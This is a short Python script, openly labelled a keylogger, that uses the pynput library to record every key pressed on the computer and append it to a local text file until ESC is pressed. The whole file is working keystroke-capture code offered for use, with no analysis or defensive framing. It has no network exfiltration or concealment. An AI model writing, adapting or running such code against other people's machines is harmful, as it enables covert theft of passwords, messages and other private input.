""" Typical Keylogger that records all characters pressed by the current computer once ran."""
from pynput import keyboard #be sure to pip install pynput first
    
def keyPressed(key):  #key is an auto passed parameter
    with open("keyfile.txt", 'a') as logKey: #python specific open files to write in 
        try: 
            char = key.char
            if char is not None:
                logKey.write(char)
        except AttributeError: #catch all non char keys
            if key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                logKey.write('\n')
            else:
                if key is None or key.name is None:
                    print(key)
                    # NOTE: this keylogger does not notice F1-12
                    logKey.write('[NaN Not Supported]')
                logKey.write(f'[{key.name}]')

def loggerStopped(key):
    if key == keyboard.Key.esc: #to stop keylogger, press ESC
        print('Stopped logging')
        return False

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed, on_release=loggerStopped)
    listener.start()
    input()